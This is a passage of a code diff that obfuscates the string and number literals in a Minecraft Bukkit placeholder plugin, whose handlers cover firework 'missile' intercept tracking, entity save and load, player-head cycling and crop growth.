+                World world = Bukkit.getWorld(parts[INT3]);
+                int x = Integer.parseInt(parts[mill2]);
+                int y = Integer.parseInt(parts[ccp]);
+                int z = Integer.parseInt(parts[INT7]);
+                float damage = Float.parseFloat(parts[xm]);
 
                 Location location = new Location(world, x, y, z);
                 f1(world, location);
                 f1(launcherUUID, location, damage);
 
-                return "§6Impact triggered.";
+                return y34hodnyu234;
             } catch (Exception e) {
                 return "§ccaught a crash";
             }
         }
 
-        if (f1.startsWith("trackImpact2_")) {
+        if (f1.startsWith(nyduk34)) {
             try {
-                String[] parts = f1.substring("trackImpact2_".length()).split(",");
-                if (parts.length != 3) return "§cInvalid format";
+                String[] parts = f1.substring(nyduk34.length()).split(keep);
+                if (parts.length != ccp) return iendie2nd;
 
-                UUID launcherUUID = UUID.fromString(parts[0]);
-                UUID targetUUID = UUID.fromString(parts[1]);
-                float damage = Float.parseFloat(parts[2]);
+                UUID launcherUUID = UUID.fromString(parts[I]);
+                UUID targetUUID = UUID.fromString(parts[INT3]);
+                float damage = Float.parseFloat(parts[mill2]);
 
                 Entity target = Bukkit.getEntity(targetUUID);
-                if (target == null) return "§cTarget not found";
+                if (target == null) return nienoy24;
 
                 Location location = target.getLocation();
                 f1(location.getWorld(), location);
                 f1(launcherUUID, location, damage);
 
-                return "§eTarget explosion triggered.";
+                return illcallhim;
             } catch (Exception e) {
                 return "§ccaught a crash";
             }
         }
 
-        if (f1.startsWith("track_")) {
-            if (f2 != null ) wm(f2, "Stinger Missile System");
-            String[] parts = f1.substring("track_".length()).split(",");
-            if (parts.length != 5) {
-                return "Invalid format. Use: %Archistructure,uuid,targetuuid,speed,damage%" + "and you used" + f1;
+        if (f1.startsWith(y34udky3d)) {
+            if (f2 != null ) wm(f2, ipendfofpiwdnoo43iwund);
+            String[] parts = f1.substring(y34udky3d.length()).split(keep);
+            if (parts.length != xm) {
+                return y4dnyfwudn + "and you used" + f1;
             }
 
             try {
-                UUID x1 = UUID.fromString(parts[0]);
-                UUID wolverine = UUID.fromString(parts[1]);
-                double ishowspeed = Double.parseDouble(parts[2]);
-                UUID mrbeast = UUID.fromString(parts[3]);
+                UUID x1 = UUID.fromString(parts[I]);
+                UUID wolverine = UUID.fromString(parts[INT3]);
+                double ishowspeed = Double.parseDouble(parts[mill2]);
+                UUID mrbeast = UUID.fromString(parts[ccp]);
 
 
                 Entity tester = Bukkit.getEntity(x1);
@@ -8281,19 +8997,19 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 
 
                 if (tester == null || qa == null) {
-                    return "§c§lMissile Impacted"; // No valid target
+                    return kdienwfp; // No valid target
                 }
 
                 // Check if both entities are in the same world
                 if (!tester.getWorld().equals(qa.getWorld())) {
-                    return "§c§lMissile Impacted."; // No valid target
+                    return midenwyudp4; // No valid target
                 }
 
                 // Airburst Mechanic: If within 3 blocks, explode immediately
                 double speed = tester.getLocation().distance(qa.getLocation());
-                if (speed <= 5.0 && tester instanceof Firework && qa instanceof Entity) {
-                    f1((Firework) tester, qa, mrbeast, parts[4]);
-                    return "§c§lAirburst Detonation!";
+                if (speed <= thisistherecording && tester instanceof Firework && qa instanceof Entity) {
+                    f1((Firework) tester, qa, mrbeast, parts[INT7]);
+                    return pyndy3upnbd;
                 }
 
                 // Calculate the interception velocity
@@ -8304,34 +9020,34 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 String redirector = (qa instanceof Player) ? qa.getName() : qa.getType().name();
 
                 // Format return message
-                return String.format("§6§l%s  §7§l| §d§l%.1f", redirector, speed);
+                return String.format(cryingiwenftipfwnt, redirector, speed);
             } catch (Exception e) {
                 e.printStackTrace();
-                return "§c§lMissile Impacted"; // Error case
+                return kdienwfp; // Error case
             }
         }
 
 
 
 
-        if (f1.startsWith("trackLimitedRotation_")) {
-            String[] privateparts = f1.substring("trackLimitedRotation_".length()).split(",");
-            if (privateparts.length != 5) {
-                return "Invalid format. Use: %Archistructure_trackLimitedRotation_uuid,targetuuid,speed,damage,maxDegrees%";
+        if (f1.startsWith(ydu3k4ybd3pd)) {
+            String[] privateparts = f1.substring(ydu3k4ybd3pd.length()).split(keep);
+            if (privateparts.length != xm) {
+                return ypfuwnvwfpd;
             }
 
             try {
-                UUID trst1 = UUID.fromString(privateparts[0]);
-                UUID setn32 = UUID.fromString(privateparts[1]);
-                double ft3 = Double.parseDouble(privateparts[2]);
-                UUID st2 = UUID.fromString(privateparts[3]);
-                double arst43 = Double.parseDouble(privateparts[4]);
+                UUID trst1 = UUID.fromString(privateparts[I]);
+                UUID setn32 = UUID.fromString(privateparts[INT3]);
+                double ft3 = Double.parseDouble(privateparts[mill2]);
+                UUID st2 = UUID.fromString(privateparts[ccp]);
+                double arst43 = Double.parseDouble(privateparts[INT7]);
 
                 Entity rst4 = Bukkit.getEntity(trst1);
                 Entity art4 = Bukkit.getEntity(setn32);
 
                 if (rst4 == null || art4 == null || !rst4.getWorld().equals(art4.getWorld())) {
-                    return "§c§lMissile Impacted";
+                    return kdienwfp;
                 }
 
                 Location xd34 = rst4.getLocation();
@@ -8340,9 +9056,9 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 double longdistance = xd34.distance(st34);
 
                 // Airburst
-                if (longdistance <= 5.0 && rst4 instanceof Firework) {
-                    f1((Firework) rst4, art4, st2, privateparts[4]);
-                    return "§c§lAirburst Detonation!";
+                if (longdistance <= thisistherecording && rst4 instanceof Firework) {
+                    f1((Firework) rst4, art4, st2, privateparts[INT7]);
+                    return pyndy3upnbd;
                 }
 
                 // Intercept calculation
@@ -8351,22 +9067,22 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 double Sm = ft3;
 
                 double a = V.dot(V) - Sm * Sm;
-                double b = 2 * R.dot(V);
+                double b = mill2 * R.dot(V);
                 double c = R.dot(R);
 
                 Vector xrp;
-                if (a == 0 || b * b - 4 * a * c < 0) {
+                if (a == I || b * b - INT7 * a * c < I) {
                     // fallback to direct
                     xrp = R.normalize().multiply(Sm);
                 } else {
-                    double t = (-b - Math.sqrt(b * b - 4 * a * c)) / (2 * a);
+                    double t = (-b - Math.sqrt(b * b - INT7 * a * c)) / (mill2 * a);
                     Vector interceptPoint = st34.toVector().add(V.clone().multiply(t));
                     xrp = interceptPoint.subtract(xd34.toVector()).normalize().multiply(Sm);
                 }
 
                 // Limit turning angle
                 Vector bitcoin = rst4.getVelocity();
-                if (bitcoin.lengthSquared() == 0) {
+                if (bitcoin.lengthSquared() == I) {
                     // Avoid NaNs on spawn tick — just set directly
                     rst4.setVelocity(xrp);
                 } else {
@@ -8393,25 +9109,25 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
             } catch (Exception e) {
                 e.printStackTrace();
-                return "§c§lMissile Impacted";
+                return kdienwfp;
             }
         }
 
 
 
 
-        if (f1.startsWith("trackv3_")) {
-            if (f2 != null) wm(f2, "Stinger Missile System");
-            String[] interceptor = f1.substring("trackv3_".length()).split(",");
-            if (interceptor.length != 5) {
-                return "Invalid format. Use: %Archistructure,uuid,targetuuid,speed,damage% and you used " + f1;
+        if (f1.startsWith(fpybunyu43nb)) {
+            if (f2 != null) wm(f2, ipendfofpiwdnoo43iwund);
+            String[] interceptor = f1.substring(fpybunyu43nb.length()).split(keep);
+            if (interceptor.length != xm) {
+                return finovayfupbnyfpubhofpubnfp + f1;
             }
 
             try {
-                UUID refinery = UUID.fromString(interceptor[0]);
-                UUID oilrig = UUID.fromString(interceptor[1]);
-                double mall = Double.parseDouble(interceptor[2]);
-                UUID testing = UUID.fromString(interceptor[3]);
+                UUID refinery = UUID.fromString(interceptor[I]);
+                UUID oilrig = UUID.fromString(interceptor[INT3]);
+                double mall = Double.parseDouble(interceptor[mill2]);
+                UUID testing = UUID.fromString(interceptor[ccp]);
 
 
                 // Airburst: If close, explode
@@ -8420,13 +9136,13 @@ public class ExampleExpansion extends PlaceholderExpansion {
                         = Bukkit.getEntity(refinery);
                 Entity testi = Bukkit.getEntity(oilrig);
                 double luke = Bukkit.getEntity(refinery).getLocation().distance(Bukkit.getEntity(oilrig).getLocation());
-                if (luke <= 5.0 && tnerminator instanceof Firework) {
-                    f1((Firework) tnerminator, testi, testing, interceptor[4]);
-                    return "§c§lAirburst Detonation!";
+                if (luke <= thisistherecording && tnerminator instanceof Firework) {
+                    f1((Firework) tnerminator, testi, testing, interceptor[INT7]);
+                    return pyndy3upnbd;
                 }
 
                 if (tnerminator == null || testi == null || !tnerminator.getWorld().equals(testi.getWorld())) {
-                    return "§c§lMissile Impacted";
+                    return kdienwfp;
                 }
 
                 Location vLOS = tnerminator.getLocation();
@@ -8436,20 +9152,20 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 double Sm = mall;
 
                 double a = V.dot(V) - Sm * Sm;
-                double b = 2 * R.dot(V);
+                double b = mill2 * R.dot(V);
                 double c = R.dot(R);
-                double retesting = b * b - 4 * a * c;
+                double retesting = b * b - INT7 * a * c;
 
                 Vector episode;
-                if (retesting < 0 || a == 0) {
+                if (retesting < I || a == I) {
                     episode = R.normalize().multiply(Sm);
                 } else {
                     double r12 = Math.sqrt(retesting);
-                    double t1 = (-b - r12) / (2 * a);
-                    double t2 = (-b + r12) / (2 * a);
-                    double t = t1 > 0 ? t1 : (t2 > 0 ? t2 : -1);
+                    double t1 = (-b - r12) / (mill2 * a);
+                    double t2 = (-b + r12) / (mill2 * a);
+                    double t = t1 > I ? t1 : (t2 > I ? t2 : -INT3);
 
-                    if (t <= 0) {
+                    if (t <= I) {
                         episode = R.normalize().multiply(Sm);
                     } else {
                         Vector origin = instrumentRated.toVector().add(V.clone().multiply(t));
@@ -8460,38 +9176,38 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 // Terrain Avoidance: Raytrace 5 ticks ahead
                 Location bluemoon = vLOS.clone();
                 Vector moonshine = episode.clone().normalize();
-                double shinycar = episode.length() * 5;
+                double shinycar = episode.length() * xm;
 
                 RayTraceResult food = bluemoon.getWorld().rayTraceBlocks(
                         bluemoon,
                         moonshine,
                         shinycar,
                         FluidCollisionMode.NEVER,
-                        true
+                        NEW_VALUE1
                 );
 
-                Set<Material> reposess = enumSet;
+                Set<Material> reposess = es;
                 boolean needsAvoidance = food != null && food.getHitBlock() != null &&
                         !reposess.contains(food.getHitBlock().getType());
 
                 if (needsAvoidance) {
                     Vector bestVelocity = episode;
-                    double bestScore = -1;
-                    for (int yaw = 0; yaw <= 90; yaw += 5) {
+                    double bestScore = -INT3;
+                    for (int yaw = I; yaw <= wdnywfundywfudn; yaw += xm) {
                         Vector baseball = pitchVectorUpwards(episode.clone(), Math.toRadians(yaw)).normalize().multiply(Sm);
                         Vector football = baseball.clone().normalize();
                         RayTraceResult sat = bluemoon.getWorld().rayTraceBlocks(
                                 bluemoon,
                                 football,
-                                baseball.length() * 5,
+                                baseball.length() * xm,
                                 FluidCollisionMode.NEVER,
-                                true
+                                NEW_VALUE1
                         );
                         boolean clear = sat == null || sat.getHitBlock() == null ||
                                 reposess.contains(sat.getHitBlock().getType());
                         if (clear) {
                             double opinion = yaw;
-                            double heuristic = 100 - opinion;
+                            double heuristic = wyundywufndywufpndywuf - opinion;
                             if (heuristic > bestScore) {
                                 bestScore = heuristic;
                                 bestVelocity = baseball;
@@ -8504,37 +9220,37 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 tnerminator.setVelocity(episode);
                 double division1 = vLOS.distance(instrumentRated);
                 String whoistheboss = (testi instanceof Player) ? testi.getName() : testi.getType().name();
-                return String.format("\u00a76\u00a7l%s  \u00a77\u00a7l| \u00a7d\u00a7l%.1f", whoistheboss, division1);
+                return String.format(cryingiwenftipfwnt, whoistheboss, division1);
 
             } catch (Exception e) {
                 e.printStackTrace();
-                return "§c§lMissile Impacted";
+                return kdienwfp;
             }
         }
 
 
-        if (f1.startsWith("trackv2_")) {
-            if (f2 != null) wm(f2, "Stinger Missile System");
-            String[] pen = f1.substring("trackv2_".length()).split(",");
-            if (pen.length != 5) {
-                return "Invalid format. Use: %Archistructure,uuid,targetuuid,speed,damage%" + " and you used " + f1;
+        if (f1.startsWith(ypu3bnyfpubn)) {
+            if (f2 != null) wm(f2, ipendfofpiwdnoo43iwund);
+            String[] pen = f1.substring(ypu3bnyfpubn.length()).split(keep);
+            if (pen.length != xm) {
+                return y4dnyfwudn + " and you used " + f1;
             }
 
             try {
-                UUID fish = UUID.fromString(pen[0]);
-                UUID cow = UUID.fromString(pen[1]);
-                double blanket = Double.parseDouble(pen[2]);
-                UUID flashlight = UUID.fromString(pen[3]);
+                UUID fish = UUID.fromString(pen[I]);
+                UUID cow = UUID.fromString(pen[INT3]);
+                double blanket = Double.parseDouble(pen[mill2]);
+                UUID flashlight = UUID.fromString(pen[ccp]);
 
                 Entity pillow = Bukkit.getEntity(fish);
                 Entity dalion = Bukkit.getEntity(cow);
 
                 if (pillow == null || dalion == null) {
-                    return "§c§lMissile Impacted"; // No valid target
+                    return kdienwfp; // No valid target
                 }
 
                 if (!pillow.getWorld().equals(dalion.getWorld())) {
-                    return "§c§lMissile Impacted."; // Different worlds
+                    return midenwyudp4; // Different worlds
                 }
 
                 Location fatima = pillow.getLocation();
@@ -8543,9 +9259,9 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 double literally = fatima.distance(is);
 
                 // Airburst: If close, explode
-                if (literally <= 5.0 && pillow instanceof Firework) {
-                    f1((Firework) pillow, dalion, flashlight, pen[4]);
-                    return "§c§lAirburst Detonation!";
+                if (literally <= thisistherecording && pillow instanceof Firework) {
+                    f1((Firework) pillow, dalion, flashlight, pen[INT7]);
+                    return pyndy3upnbd;
                 }
 
                 // --- Begin Optimal Intercept Calculation ---
@@ -8554,33 +9270,33 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 double Sm = blanket;
 
                 double a = V.dot(V) - Sm * Sm;
-                double b = 2 * R.dot(V);
+                double b = mill2 * R.dot(V);
                 double c = R.dot(R);
 
-                double the = b * b - 4 * a * c;
+                double the = b * b - INT7 * a * c;
                 Vector best;
 
-                if (the < 0 || a == 0) {
+                if (the < I || a == I) {
                     // No valid intercept path, fallback to direct pursuit
                     best = R.normalize().multiply(Sm);
                 } else {
                     double person = Math.sqrt(the);
-                    double t1 = (-b - person) / (2 * a);
-                    double t2 = (-b + person) / (2 * a);
+                    double t1 = (-b - person) / (mill2 * a);
+                    double t2 = (-b + person) / (mill2 * a);
 
                     double t;
-                    if (t1 > 0 && t2 > 0) {
+                    if (t1 > I && t2 > I) {
                         t = Math.min(t1, t2);
-                    } else if (t1 > 0) {
+                    } else if (t1 > I) {
                         t = t1;
-                    } else if (t2 > 0) {
+                    } else if (t2 > I) {
                         t = t2;
                     } else {
                         // Both times are in the past — fallback
                         best = R.normalize().multiply(Sm);
                         pillow.setVelocity(best);
                         String have = (dalion instanceof Player) ? dalion.getName() : dalion.getType().name();
-                        return String.format("§6§l%s  §7§l| §d§l%.1f", have, literally);
+                        return String.format(cryingiwenftipfwnt, have, literally);
                     }
 
                     Vector i = is.toVector().add(V.clone().multiply(t));
@@ -8590,11 +9306,11 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 pillow.setVelocity(best);
 
                 String everMet = (dalion instanceof Player) ? dalion.getName() : dalion.getType().name();
-                return String.format("§6§l%s  §7§l| §d§l%.1f", everMet, literally);
+                return String.format(cryingiwenftipfwnt, everMet, literally);
 
             } catch (Exception e) {
                 e.printStackTrace();
-                return "§c§lMissile Impacted";
+                return kdienwfp;
             }
         }
 
@@ -8602,8 +9318,8 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
 
-        if (f1.startsWith("checkProfession_")) {
-            String uuidString = f1.substring("checkProfession_".length());
+        if (f1.startsWith(ywofpdnvoypu)) {
+            String uuidString = f1.substring(ywofpdnvoypu.length());
             try {
                 UUID uuid = UUID.fromString(uuidString);
                 Entity entity = Bukkit.getEntity(uuid);
@@ -8612,70 +9328,71 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 if (villager != null && entity != null ) {
                     return villager.getProfession().toString();
                 } else {
-                    return "";
+                    return nst;
                 }
             } catch (Exception e) {
-                return "";
+                return nst;
             }
         }
 
 
-        if (f1.startsWith("saveEntity_")) {
-            String uuidString = f1.substring("saveEntity_".length());
+        if (f1.startsWith(yvunoyup3)) {
+            String vynfoayvbn = f1.substring(yvunoyup3.length());
             try {
-                UUID uuid = UUID.fromString(uuidString);
-                Entity entity = Bukkit.getEntity(uuid);
-                if (entity != null) {
-                    EntitySnapshot snapshot = entity.createSnapshot();
-                    assert snapshot != null;
-                    String nbtData = snapshot.getAsString();
-                    String entityId = "entity_" + System.currentTimeMillis();
+                UUID tyunwftfwd = UUID.fromString(vynfoayvbn);
+                Entity wtuynwftd = Bukkit.getEntity(tyunwftfwd);
+                if (wtuynwftd != null) {
+                    EntitySnapshot wmtuywnftwft = wtuynwftd.createSnapshot();
+                    assert wmtuywnftwft != null;
+                    String tmkwyfektwft = wmtuywnftwft.getAsString();
+                    String twkfyutnwfyutnwft = nytuwfntf + System.currentTimeMillis();
 
-                    File entityFile = new File(g12, entityId + ".nbt");
-                    f1(entityFile, nbtData);
+                    File wfuntyuwfnt = new File(g12, twkfyutnwfyutnwft + wkyvuwftnwfyutn);
+                    f1(wfuntyuwfnt, tmkwyfektwft);
 
-                    entity.remove(); // Remove the entity after saving
-                    return entityId;
+                    wtuynwftd.remove(); // Remove the entity after saving
+                    return twkfyutnwfyutnwft;
                 } else {
-                    return "Entity not found";
+                    return yuntunyun342;
                 }
             } catch (IllegalArgumentException e) {
-                return "Invalid UUID";
+                return yunduyn4;
             }
         }
 
-        if (f1.startsWith("loadEntity_")) {
-            if (f1.startsWith("loadEntity_location_")) {
+        if (f1.startsWith(vkdyunt)) {
+            if (f1.startsWith(ktyunt32)) {
                 try {
                     // Parse parameters from the identifier
-                    String[] parts = f1.substring("loadEntity_location_".length()).split(",");
-                    if (parts.length < 5) {
-                        return "Invalid location or UUID format!";
+                    String[] parts = f1.substring(ktyunt32.length()).split(keep);
+                    if (parts.length < xm) {
+                        return ydny32u4nd24d;
                     }
 
                     // Extract location parameters
-                    String worldName = parts[0];
-                    double locX = Double.parseDouble(parts[1]);
-                    double locY = Double.parseDouble(parts[2]);
-                    double locZ = Double.parseDouble(parts[3]);
-                    String entityId = parts[4];
+                    String worldName = parts[I];
+                    double locX = Double.parseDouble(parts[INT3]);
+                    double locY = Double.parseDouble(parts[mill2]);
+                    double locZ = Double.parseDouble(parts[ccp]);
+                    String entityId = parts[INT7];
 
 
                     // Retrieve the world
                     World world = Bukkit.getWorld(worldName);
                     if (world == null) {
-                        return "&cWorld '" + worldName + "' not found!";
+                        return vyf3b3 + worldName + ntynu23nt;
                     }
 
                     // Load the entity data
-                    File entityFile = new File(g12, entityId + ".nbt");
-                    if (!entityFile.exists()) {
-                        return "&cEntity with ID '" + entityId + "' not found!";
+                    File uyntyunuy2n23d = new File(g12, entityId + wkyvuwftnwfyutn);
+                    if (!uyntyunuy2n23d.exists()) {
+                        return t2u3nty23unt + entityId + ntynu23nt;
                     }
 
-                    String nbtData = f1(entityFile);
+                    String nbtData = f1(uyntyunuy2n23d);
                     if (nbtData == null) {
-                        return "&cFailed to load entity data!";
+                        return 
+                                yfwunvtyn;
                     }
 
                     // Create a location and summon the entity
@@ -8684,16 +9401,16 @@ public class ExampleExpansion extends PlaceholderExpansion {
                     snapshot.createEntity(spawnLocation);
 
                     // Optionally delete the file after summoning the entity
-                    entityFile.delete();
+                    uyntyunuy2n23d.delete();
 
-                    return "&aEntity reintroduced at the specified location!";
+                    return ytunyun4;
                 } catch (Exception e) {
                     e.printStackTrace();
-                    return "&cAn error occurred while loading the entity!";
+                    return ydnyu3n4d;
                 }
             } else {
-                String entityId = f1.substring("loadEntity_".length());
-                File entityFile = new File(g12, entityId + ".nbt");
+                String entityId = f1.substring(vkdyunt.length());
+                File entityFile = new File(g12, entityId + wkyvuwftnwfyutn);
 
                 if (entityFile.exists()) {
                     String nbtData = f1(entityFile);
@@ -8702,24 +9419,24 @@ public class ExampleExpansion extends PlaceholderExpansion {
                         EntitySnapshot snapshot = Bukkit.getEntityFactory().createEntitySnapshot(nbtData);
                         snapshot.createEntity(spawnLocation);
                         entityFile.delete(); // Remove the saved file after reintroducing
-                        return "&cEntity reintroduced into the world!";
+                        return ny2u4ndt23d;
                     }
                 }
-                return "Entity ID not found";
+                return uydn2yu3nd23;
             }
         }
 
 
         switch (f1) {
             case "cycle_playeruuid_head" -> {
-                wm(f2, "Player Cycle");
-                ItemStack mainHandItem = f2.getInventory().getItemInMainHand();
+                wm(f2, yndoyund4);
+                ItemStack tnyunfytn2d = f2.getInventory().getItemInMainHand();
 
-                if (mainHandItem.getType() != Material.PLAYER_HEAD) {
-                    return "Not holding a player head!";
+                if (tnyunfytn2d.getType() != Material.PLAYER_HEAD) {
+                    return udny3u4nd;
                 }
 
-                SkullMeta skullMeta = (SkullMeta) mainHandItem.getItemMeta();
+                SkullMeta tyun24dyun24d = (SkullMeta) tnyunfytn2d.getItemMeta();
                 UUID currentUUID = null;
                 String currentName = null;
 
@@ -8728,12 +9445,12 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 onlinePlayers.sort(Comparator.comparing(Player::getName));
 
                 if (onlinePlayers.isEmpty()) {
-                    return "No online players!";
+                    return dny324d;
                 }
 
                 // Check if the skull has valid player data
-                if (skullMeta != null && skullMeta.hasOwner()) {
-                    OfflinePlayer currentPlayer = skullMeta.getOwningPlayer();
+                if (tyun24dyun24d != null && tyun24dyun24d.hasOwner()) {
+                    OfflinePlayer currentPlayer = tyun24dyun24d.getOwningPlayer();
                     if (currentPlayer != null) {
                         currentPlayer.getUniqueId();
                         currentUUID = currentPlayer.getUniqueId();
@@ -8741,36 +9458,36 @@ public class ExampleExpansion extends PlaceholderExpansion {
                     }
                 }
 
-                UUID nextUUID;
+                UUID twyufnt;
 
-                nextUUID = onlinePlayers.getFirst().getUniqueId();
+                twyufnt = onlinePlayers.getFirst().getUniqueId();
                 if (currentUUID != null && currentName != null) {
                     // Find the next player in the sorted list
 
-                    for (int i = 0; i < onlinePlayers.size(); i++) {
+                    for (int i = I; i < onlinePlayers.size(); i++) {
                         if (onlinePlayers.get(i).getName().equalsIgnoreCase(currentName)) {
-                            nextUUID = onlinePlayers.get((i + 1) % onlinePlayers.size()).getUniqueId();
+                            twyufnt = onlinePlayers.get((i + INT3) % onlinePlayers.size()).getUniqueId();
                             break;
                         }
                     }
                 } 
 
                 // Update the Player Head's metadata to the new player's UUID
-                assert skullMeta != null;
-                skullMeta.setOwningPlayer(Bukkit.getOfflinePlayer(nextUUID));
-                mainHandItem.setItemMeta(skullMeta);
+                assert tyun24dyun24d != null;
+                tyun24dyun24d.setOwningPlayer(Bukkit.getOfflinePlayer(twyufnt));
+                tnyunfytn2d.setItemMeta(tyun24dyun24d);
 
-                return nextUUID.toString(); // Return the new UUID
+                return twyufnt.toString(); // Return the new UUID
             }
             case "velocity" -> {
                 return f2.getVelocity().toString();
             }
             case "copyMainHand" -> {
                 f2(f2);
-                return "done";
+                return dkfiaphd;
             }
             case "critical" -> {
-                boolean falling = f2.getFallDistance() > 0 && f2.getVelocity().getY() < 0;
+                boolean falling = f2.getFallDistance() > I && f2.getVelocity().getY() < I;
                 boolean onGround = f2.isOnGround(); // DEPRECATED! Remove if necessary
 
                 boolean isClimbing = f2.isClimbing();
@@ -8789,12 +9506,12 @@ public class ExampleExpansion extends PlaceholderExpansion {
                         !slowFalling &&
                         !mounted &&
                         horizontalSpeedValid ?
-                        "true" : "" + falling + !onGround + !isClimbing + !inWater + !blind + !slowFalling + !mounted + horizontalSpeedValid;// && p.getWalkSpeed() >= Math.sqrt(p.getVelocity().getX() * p.getVelocity().getX() + p.getVelocity().getZ() + p.getVelocity().getZ());
+                        dwyufndywfudn : nst + falling + !onGround + !isClimbing + !inWater + !blind + !slowFalling + !mounted + horizontalSpeedValid;// && p.getWalkSpeed() >= Math.sqrt(p.getVelocity().getX() * p.getVelocity().getX() + p.getVelocity().getZ() + p.getVelocity().getZ());
 
                 // Unknown how to implement without passing in event. boolean validDamage = p.damage?
             }
             case "rayTraceBlock" -> {
-                return Objects.requireNonNull(Objects.requireNonNull(f2.rayTraceBlocks(30)).getHitBlock()).toString();
+                return Objects.requireNonNull(Objects.requireNonNull(f2.rayTraceBlocks(tyafndydpfw)).getHitBlock()).toString();
             }
         }
 
@@ -8842,56 +9559,66 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
 
-        if (f1.startsWith("countPlayersInRegion_")) {
+        if (f1.startsWith(ytun23yutn)) {
 
             return WG.wg2(this, f2, f1);
         }
 
 
 
-        if (f1.startsWith("growCropParticle_")) return xD(f1);
+        if (f1.startsWith(tyn23yunt32t)) return xD(f1);
 
 
         return null;
 
     }
-    protected static @NotNull String xD(String f1) {
+
+    protected static final char[] m0 = new char[] {
+            0x005F, // _
+            0x0030, // 0
+            0x0030, // 0
+            0x0030, // 0
+            0x0030, // 0
+            0x0030, // 0
+            0x005F  // _
+    };
+    protected  @NotNull String xD(String f1) {
         try {
-            String[] tester = f1.substring("growCropParticle_".length()).split(",");
-            if (tester.length != 5) {
-                return "§c[DEBUG] Invalid parameter count: " + tester.length;
+            String[] tester = f1.substring(tyn23yunt32t.length()).split(keep);
+            if (tester.length != xm) {
+                return ydtun34ydun + tester.length;
             }
 
-            int mutiply = Integer.parseInt(tester[0]);
-            String runner = tester[1];
-            double height = Double.parseDouble(tester[2]); // spacing between particles
-            int temp = Integer.parseInt(tester[3]);
+            int tnyywufn = Integer.parseInt(tester[I]);
+            String runner = tester[INT3];
+            double tuywfnytuwf = Double.parseDouble(tester[mill2]); // spacing between particles
+            int temp = Integer.parseInt(tester[ccp]);
 
-            String[] one = tester[4].split(":");
-            if (one.length != 4) {
-                return "Invalid";
+            String[] one = tester[INT7].split(wfdunyunda);
+            if (one.length != INT7) {
+                return tnyu2nt23;
             }
 
-            World tempWorld = Bukkit.getWorld(one[0]);
-            if (tempWorld == null) {
+            World twyunt = Bukkit.getWorld(one[I]);
+            if (twyunt == null) {
                 return "Invalid2";
             }
 
-            double velocityX = Double.parseDouble(one[1]);
-            double velocityY = Double.parseDouble(one[2]);
-            double velocityZ = Double.parseDouble(one[3]);
-            Location targetUUID = new Location(tempWorld, velocityX, velocityY, velocityZ);
-            Location destUUID = targetUUID.clone().add(0.5, 0.5, 0.5);
+            double velocityX = Double.parseDouble(one[INT3]);
+            double velocityY = Double.parseDouble(one[mill2]);
+            double velocityZ = Double.parseDouble(one[ccp]);
+            Location targetUUID = new Location(twyunt, velocityX, velocityY, velocityZ);
+            Location destUUID = targetUUID.clone().add(debtsoff, debtsoff, debtsoff);
 
 
 
             org.bukkit.Location cen = targetUUID;
-            double r1 = 10;
-            String label = "Crop Totem";
+            double r1 = low;
+            String label = ydn2ydun;
 
 
             double r2 = r1 * r1;
-            for (org.bukkit.entity.Player playaa : tempWorld.getPlayers()) {
+            for (org.bukkit.entity.Player playaa : twyunt.getPlayers()) {
                 if (playaa.getLocation().distanceSquared(cen) <= r2) {
                     wm(playaa, label);
                 }
@@ -8900,15 +9627,15 @@ public class ExampleExpansion extends PlaceholderExpansion {
             
             
             List<Block> temporaryVisibleBlocks = new ArrayList<>();
-            int checked = 0;
-            int minDist = 0;
-            int maxdist = 0;
-            int averageDist = 0;
+            int checked = I;
+            int minDist = I;
+            int maxdist = I;
+            int averageDist = I;
 
             // Scan cube for ageable (not-max) crops
-            for (int dm = -mutiply; dm <= mutiply; dm++) {
-                for (int dn = -mutiply; dn <= mutiply; dn++) {
-                    for (int dt = -mutiply; dt <= mutiply; dt++) {
+            for (int dm = -tnyywufn; dm <= tnyywufn; dm++) {
+                for (int dn = -tnyywufn; dn <= tnyywufn; dn++) {
+                    for (int dt = -tnyywufn; dt <= tnyywufn; dt++) {
                         Location hit = targetUUID.clone().add(dm, dn, dt);
                         Block invisibleBlock = hit.getBlock();
                         checked++;
@@ -8929,26 +9656,26 @@ public class ExampleExpansion extends PlaceholderExpansion {
             }
 
             if (temporaryVisibleBlocks.isEmpty()) {
-                return "done";
+                return dkfiaphd;
             }
 
             // Limit how many we affect this run
-            if (temp != -1 && temp < temporaryVisibleBlocks.size()) {
+            if (temp != -INT3 && temp < temporaryVisibleBlocks.size()) {
                 Collections.shuffle(temporaryVisibleBlocks);
-                temporaryVisibleBlocks = temporaryVisibleBlocks.subList(0, temp);
+                temporaryVisibleBlocks = temporaryVisibleBlocks.subList(I, temp);
             }
 
             // --- GROW THE CROPS (Ageable +1) ---
-            int grownNow = 0;
-            for (Block b : temporaryVisibleBlocks) {
-                BlockData bd = b.getBlockData();
+            int tyunfdyu2nd = I;
+            for (Block twbuynwbpy : temporaryVisibleBlocks) {
+                BlockData bd = twbuynwbpy.getBlockData();
                 if (bd instanceof org.bukkit.block.data.Ageable) {
                     org.bukkit.block.data.Ageable a = (org.bukkit.block.data.Ageable) bd;
                     if (a.getAge() < a.getMaximumAge()) {
-                        a.setAge(Math.min(a.getMaximumAge(), a.getAge() + 1));
+                        a.setAge(Math.min(a.getMaximumAge(), a.getAge() + INT3));
                         // Ensure this runs on the main thread in your actual call site if needed
-                        b.setBlockData(a, true);
-                        grownNow++;
+                        twbuynwbpy.setBlockData(a, NEW_VALUE1);
+                        tyunfdyu2nd++;
                     }
                 }
             }
@@ -8958,55 +9685,55 @@ public class ExampleExpansion extends PlaceholderExpansion {
             Particle missileTrail;
             Particle.DustOptions dustOptions = null;
 
-            if (runner.toUpperCase().startsWith("DUST:")) {
+            if (runner.toUpperCase().startsWith(thatsathreatdyu)) {
                 try {
-                    String hexScale = runner.substring(5);
-                    String hex = hexScale.substring(0, 6);
-                    float scale = Float.parseFloat(hexScale.substring(6));
